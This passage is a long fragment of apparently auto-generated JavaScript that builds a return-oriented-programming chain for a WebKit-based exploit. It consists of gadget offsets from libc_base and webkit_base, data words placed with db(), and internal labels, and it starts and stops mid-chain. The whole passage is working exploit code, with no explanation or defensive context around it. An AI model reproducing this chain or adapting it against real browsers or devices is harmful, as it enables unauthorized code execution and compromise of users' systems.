libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+96880, //L806
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+96848, //L804
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+96864, //L805
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L804:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L805:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L806:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+96952, //L807
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L807:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+97008, //L809
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L809:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+97088, //L813
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L813:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L811:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L812:
db([12, 0]); // 0xc
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+97192, //L814
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+97208, //L815
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L814:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L815:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+97296, //L816
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L816:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+97352, //L818
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L818:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+97424, //L820
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L820:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+97480, //L822
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L822:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L824:
libc_base+793877, //pop rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+97616, //L825
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L825:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L827:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+97736, //L830
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+97720, //L828
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L828:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L830:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+97880, //L833
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+97848, //L831
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+97864, //L832
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L831:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L832:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L833:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+97952, //L834
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L834:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+98008, //L836
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L836:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+98088, //L840
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L840:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L838:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L839:
db([13, 0]); // 0xd
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+98192, //L841
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+98208, //L842
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L841:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L842:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+98296, //L843
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L843:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+98352, //L845
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L845:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+98424, //L847
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L847:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+98480, //L849
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L849:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+98568, //L851
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L851:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L853:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+98688, //L856
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+98672, //L854
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L854:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L856:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+98832, //L859
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+98800, //L857
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+98816, //L858
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L857:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L858:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L859:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+98904, //L860
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L860:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+98960, //L862
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L862:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+99040, //L866
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L866:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L864:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L865:
db([5, 0]); // 0x5
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+99144, //L867
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+99160, //L868
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L867:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L868:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+99248, //L869
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L869:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+99304, //L871
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L871:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+99408, //L873
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L873:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L875:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+99528, //L878
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+99512, //L876
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L876:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L878:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+99672, //L881
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+99640, //L879
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+99656, //L880
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L879:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L880:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L881:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+99744, //L882
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L882:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+99800, //L884
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L884:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+99880, //L888
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L888:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L886:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L887:
db([14, 0]); // 0xe
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+99984, //L889
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+100000, //L890
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L889:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L890:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+100088, //L891
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L891:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+100144, //L893
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L893:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+100216, //L895
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L895:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+100272, //L897
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L897:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L899:
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+100408, //L900
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L900:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L902:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+100528, //L905
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+100512, //L903
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L903:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L905:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+100672, //L908
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+100640, //L906
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+100656, //L907
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L906:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L907:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L908:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+100744, //L909
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L909:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+100800, //L911
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L911:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+100880, //L915
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L915:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L913:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L914:
db([15, 0]); // 0xf
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+100984, //L916
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+101000, //L917
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L916:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L917:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+101088, //L918
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L918:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+101144, //L920
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L920:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+101216, //L922
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L922:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+101272, //L924
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L924:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L926:
libc_base+877877, //mov rax, rdx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+101408, //L927
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L927:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L929:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+101528, //L932
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+101512, //L930
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L930:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L932:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+101672, //L935
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+101640, //L933
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+101656, //L934
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L933:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L934:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L935:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+101744, //L936
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L936:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+101800, //L938
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L938:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+101880, //L942
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L942:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L940:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L941:
db([16, 0]); // 0x10
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+101984, //L943
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+102000, //L944
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L943:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L944:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+102088, //L945
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L945:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+102144, //L947
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L947:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+102216, //L949
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L949:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+102272, //L951
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L951:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L953:
libc_base+793877, //pop rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+102408, //L954
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L954:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L956:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+102528, //L959
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+102512, //L957
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L957:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L959:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+102672, //L962
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+102640, //L960
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+102656, //L961
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L960:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L961:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L962:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+102744, //L963
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L963:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+102800, //L965
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L965:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+102880, //L969
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L969:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L967:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L968:
db([17, 0]); // 0x11
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+102984, //L970
